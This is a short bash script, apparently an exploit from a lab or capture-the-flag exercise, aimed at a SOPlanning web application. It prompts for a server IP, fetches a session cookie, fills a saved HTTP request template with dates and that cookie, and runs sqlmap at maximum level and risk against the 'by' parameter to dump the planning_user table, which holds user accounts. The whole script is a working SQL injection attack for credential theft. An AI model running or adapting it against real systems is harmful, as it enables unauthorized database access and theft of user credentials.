#!/bin/bash

read -rp "Server IP: " SERVER_IP
TEMP_FILE="/tmp/request.req"
cp projects.req "$TEMP_FILE"

TODAY_DAY=$(date +%d)
TODAY_MONTH=$(date +%m)
TODAY_YEAR=$(date +%Y)
END_TIME=$(curl "https://www.datecalculator.org/calculate.php?method=datecalculator&operation=add&format=3&timeFormat=2&monthname=0&dayname=0&showtime=0&day=$TODAY_DAY&month=$TODAY_MONTH&year=$TODAY_YEAR&hour1=00&minute1=00&second1=00&days=0&weeks=0&months=2&years=0&hours=0&minutes=0&seconds=0" --compressed --silent | cut -d ">" -f 2 | cut -d " " -f 1 | head -n 1)
COOKIE=$(curl -ILs "http://$SERVER_IP:8080/soplanning" | grep "Set-Cookie" | awk '{print $2}')

sed -i "s/HOSTNAME/$SERVER_IP:8080/g" "$TEMP_FILE"
sed -i "s/DD/$TODAY_DAY/1" "$TEMP_FILE"
sed -i "s/MM/$TODAY_MONTH/1" "$TEMP_FILE"
sed -i "s/YYYY/$TODAY_YEAR/1" "$TEMP_FILE"
sed -i "s#END_DATE#$END_TIME#1" "$TEMP_FILE"
sed -i "s#COOKIE#$COOKIE#1" "$TEMP_FILE"

sqlmap -r "$TEMP_FILE" --level=5 --risk=3 -p by --dbms=mysql -D soplanning -T planning_user --dump
